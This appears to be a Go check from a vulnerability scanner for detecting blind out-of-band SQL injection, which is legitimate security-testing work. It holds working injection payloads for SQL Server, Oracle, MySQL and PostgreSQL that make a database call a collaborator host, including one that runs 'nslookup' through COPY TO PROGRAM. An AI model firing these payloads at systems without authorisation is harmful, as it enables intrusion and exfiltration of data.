package checks

import (
	"context"

	"lanternfish/internal/httpmsg"
	"lanternfish/internal/scan"
)

// BlindSQLiOOB detects SQL injection out of band. When a query is injectable
// but the response reveals nothing — no error, no boolean difference, no usable
// timing — the database can still be made to perform a DNS or HTTP lookup to a
// unique collaborator host. A callback proves the injection. This is the only
// technique that catches fully blind SQLi, and it is how it is found in
// practice. It needs an out-of-band interactor in the context (the local
// listener for your own box, or a public Interactsh server for remote targets).
//
// Payloads are per-DBMS and public (OWASP / PortSwigger references):
//   - Microsoft SQL Server: xp_dirtree / xp_fileexist against a UNC path.
//   - Oracle: UTL_INADDR, UTL_HTTP, DBMS_LDAP.
//   - MySQL (Windows): LOAD_FILE on a UNC path.
//   - PostgreSQL: COPY ... TO PROGRAM, dblink.
type BlindSQLiOOB struct{}

func (BlindSQLiOOB) ID() string { return "sqli-oob" }

// ProbeOOB fires the per-DBMS exfiltration payloads without waiting and returns
// a watch the engine polls once after the audit pass.
func (BlindSQLiOOB) ProbeOOB(ctx context.Context, s scan.Sender, base *httpmsg.Request, p scan.InsertionPoint) []scan.OOBWatch {
	interactor, ok := scan.InteractorFrom(ctx)
	if !ok {
		return nil
	}

	// A DNS callback is the most reliable (egress DNS is almost always allowed,
	// and a UNC/hostname lookup needs no outbound TCP); also mint an HTTP
	// callback for engines that can make web requests. Poll both tokens.
	var tokens []string
	var dnsHost string
	if di, ok := interactor.(dnsInteractor); ok {
		if t, fqdn, ok := di.NewDNSPayload(); ok {
			tokens = append(tokens, t)
			dnsHost = fqdn
		}
	}
	httpTok, callback := interactor.NewPayload()
	tokens = append(tokens, httpTok)
	host := dnsHost
	if host == "" {
		host = callbackHost(callback)
	}

	unc := `\\` + host + `\x`
	payloads := []string{
		// Microsoft SQL Server
		"';EXEC master..xp_dirtree '" + unc + "';--",
		"';EXEC master..xp_fileexist '" + unc + "';--",
		"\";EXEC master..xp_dirtree '" + unc + "';--",
		// Oracle
		"'||(SELECT UTL_INADDR.get_host_address('" + host + "') FROM dual)||'",
		"'||(SELECT UTL_HTTP.request('" + callback + "') FROM dual)||'",
		"'||(SELECT DBMS_LDAP.INIT('" + host + "',80) FROM dual)||'",
		// MySQL on Windows (UNC triggers an SMB name resolution)
		"' UNION SELECT LOAD_FILE('" + unc + "')-- -",
		"' AND LOAD_FILE('" + unc + "')-- -",
		// PostgreSQL
		"';COPY (SELECT '') TO PROGRAM 'nslookup " + host + "';--",
		// Numeric context variants (no leading quote)
		";EXEC master..xp_dirtree '" + unc + "';--",
		"||(SELECT UTL_INADDR.get_host_address('" + host + "') FROM dual)||",
	}
	for _, pl := range payloads {
		if ctx.Err() != nil {
			return nil
		}
		if _, err := s.Send(ctx, p.Mutate(p.Base+pl)); err != nil {
			continue
		}
	}

	return []scan.OOBWatch{{
		Tokens: tokens,
		Issue: &scan.Issue{
			Check: "sqli-oob", Name: "SQL injection (out-of-band)",
			URL: base.AbsoluteURL().String(), Param: p.Name,
			Severity: scan.SeverityCritical, Confidence: scan.ConfidenceCertain,
			Detail: "Injecting a database payload that performs a DNS/HTTP lookup to a unique Lanternfish collaborator host into " + vectorLabel(p) +
				" caused the backend database to contact the listener, confirming out-of-band SQL injection.",
			Remediation: "Use parameterized queries/prepared statements. Never concatenate input into SQL, and restrict database privileges (no xp_dirtree/UTL_HTTP/LOAD_FILE/COPY TO PROGRAM for the app account).",
			CWE:         "CWE-89",
		},
	}}
}

func (c BlindSQLiOOB) Active(ctx context.Context, s scan.Sender, base *httpmsg.Request, p scan.InsertionPoint) []*scan.Issue {
	return waitOOB(ctx, c.ProbeOOB(ctx, s, base, p))
}
